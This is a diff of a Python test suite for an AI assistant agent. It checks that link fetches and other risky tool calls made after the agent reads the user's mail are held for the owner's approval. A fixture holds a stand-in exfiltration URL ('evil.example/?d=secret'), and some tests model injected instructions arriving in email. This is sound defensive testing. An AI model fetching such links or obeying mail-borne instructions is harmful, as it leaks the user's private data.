@@ -35,6 +35,12 @@ from ._agent_loop_fakes import FinalMsg, TextBlock, ToolUseBlock
 from .test_delegation_tools import FakeMailbox
 from .test_delegation_turn import _TextProvider
 
+
+def _held(result: Any) -> bool:
+    """The step came to the owner as an Approve card (orchestrator.levels)."""
+    parsed = json.loads(result)
+    return parsed.get("status") == "waiting_for_approval" and isinstance(parsed.get("decision_instance_id"), int)
+
 GHOSTWRITE = {"intent": "Yes.", "thread_id": "t1"}
 SLACK = {"slack_user_id": "U123", "text": "Replied to Dana."}
 LINK = {"question": "what is at https://evil.example/?d=secret"}
@@ -196,10 +202,9 @@ def test_a_link_after_the_turn_read_mail_is_refused(fetched: list[dict[str, Any]
         [ToolUseBlock("tu2", "run_executive_research", LINK)],
     )
     assert fetched == []
-    refusal = json.loads(_tool_results(calls[2])["tu2"])["error"]
-    assert "read the user's own mail" in refusal and "next message" in refusal
+    assert _held(_tool_results(calls[2])["tu2"])
     rows = [r for r in audit_logger._default_logger.query(event_type="tool_invocation", limit=50)
-            if (r.details or {}).get("refused") == "mail_touched"]
+            if (r.details or {}).get("held") == "mail_touched"]
     assert len(rows) == 1 and rows[0].private
 
 
@@ -212,7 +217,7 @@ def test_a_link_in_the_same_round_is_refused_too(fetched: list[dict[str, Any]]) 
     assert fetched == []
     results = _tool_results(calls[1])
     assert json.loads(results["tu1"])["status"] == "drafted"
-    assert "read the user's own mail" in json.loads(results["tu2"])["error"]
+    assert _held(results["tu2"])
 
 
 def test_a_link_beside_a_notes_recall_is_refused(fetched: list[dict[str, Any]]) -> None:
@@ -411,7 +416,7 @@ def test_the_gateway_opens_a_drive_file_in_a_conversation_that_read_mail(read_ma
 
 class _Collect(logging.Handler):
     def __init__(self) -> None:
-        super().__init__(logging.WARNING)
+        super().__init__(logging.INFO)
         self.lines: list[str] = []
 
     def emit(self, record: logging.LogRecord) -> None:
@@ -427,7 +432,7 @@ def test_the_log_never_carries_a_call_tools_own_words(sent: list[dict[str, Any]]
     log = logging.getLogger("openexecutive.orchestrator.executive")
     collect, prior = _Collect(), log.level
     log.addHandler(collect)
-    log.setLevel(logging.WARNING)
+    log.setLevel(logging.INFO)
     try:
         _turn(
             [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
@@ -442,9 +447,8 @@ def test_the_log_never_carries_a_call_tools_own_words(sent: list[dict[str, Any]]
     assert ex._loggable_tool("google_workspace__send_gmail_message") == "google_workspace__send_gmail_message"
     assert ex._loggable_tool(leak) == "call_tool:<unlisted>"
     rows = [r for r in audit_logger._default_logger.query(event_type="tool_invocation", limit=50)
-            if (r.details or {}).get("refused") == "mail_touched"]
+            if (r.details or {}).get("held") == "mail_touched"]
     assert rows and rows[0].private and rows[0].details["tool"] == leak
-
 
 
 @pytest.mark.parametrize("tool", sorted(lockdown.MAIL_TOUCHED_WITHHELD_TOOLS))
@@ -516,67 +520,10 @@ def test_a_contact_the_speaker_names_is_added_after_reading_mail(
     assert added == ([jamie] if reads_mail else [jamie, stranger, planted])
 
 
-def test_a_go_runs_the_held_step_while_its_mail_read_waits(monkeypatch: pytest.MonkeyPatch) -> None:
-    """The chat loop end to end: a step held after a mail read runs on the
-    person's go, in the same round as a mailbox read, which waits a round
-    (outside_content.defers_read) and so doesn't hold it again."""
-    from openexecutive.orchestrator import outside_content
-
-    followups: list[dict[str, Any]] = []
-
-    async def handler(tool_input: dict[str, Any]) -> str:
-        followups.append(tool_input)
-        return json.dumps({"status": "scheduled"})
-
-    monkeypatch.setitem(ex._ALL_SKILL_HANDLERS, "schedule_followup", handler)
-    outside_content._HELD.clear()
-    principal = people_store.upsert_person(full_name="Olivia Owner", is_principal=True, email="olivia@co.example")
-    people_registry.invalidate()
-    person = people_store.get_person(principal)
-    session = Session(
-        delegation_override=DelegationOverride(enabled=True, gmail=FakeMailbox(), person=person),
-        from_web_chat=True,
-    )
-    followup = {"text": "Chase Dana on the pilot", "when": "tomorrow 9am"}
-    read = {"query": "from:dana"}
-
-    def turn(message: str, *rounds: list[Any]) -> list[Any]:
-        finals = [FinalMsg(uses, "tool_use") for uses in rounds]
-        finals.append(FinalMsg([TextBlock("Done.")], "end_turn"))
-        provider = _TextProvider(finals)
-
-        async def go() -> None:
-            with (
-                patch("openexecutive.orchestrator.executive.get_provider", return_value=provider),
-                patch("openexecutive.orchestrator.executive.audit_log", log_event),
-            ):
-                async for _ in ex.Executive().stream_chat(message, session, person_id=principal):
-                    pass
-
-        asyncio.run(go())
-        return provider.calls
-
-    turn(
-        "reply to Dana as me and set a follow-up",
-        [ToolUseBlock("tu1", "ghostwrite_email", GHOSTWRITE)],
-        [ToolUseBlock("tu2", "schedule_followup", followup)],
-    )
-    assert followups == []
-    calls = turn(
-        "go",
-        [ToolUseBlock("tu3", "search_my_email", read), ToolUseBlock("tu4", "schedule_followup", followup)],
-    )
-    assert followups == [followup]
-    results = _tool_results(calls[1])
-    assert "reads wait one round" in json.loads(results["tu3"])["error"]
-    outside_content._HELD.clear()
-
-
 # --------------------------------------------------------------------------- #
 # The safety level decides how much of the lockdown holds: every mail read is
 # checked (outside_content.check_mail_read, orchestrator.content_scan).
 # --------------------------------------------------------------------------- #
-
 
 
 def _level(monkeypatch: pytest.MonkeyPatch, mode: str, verdict: Any) -> None:
@@ -643,7 +590,7 @@ def test_balanced_holds_after_mail_the_check_flagged(
     assert fetched == []
     # The model read the mail behind the notice not to follow it.
     assert str(_result_of(calls, "tu1")).startswith("[Safety check: this content looks like")
-    assert "read the user's own mail" in json.loads(_result_of(calls, "tu2"))["error"]
+    assert _held(_result_of(calls, "tu2"))
     assert outside_content._SOURCE_WORDS[outside_content.MAIL] == "An email I read"
 
 
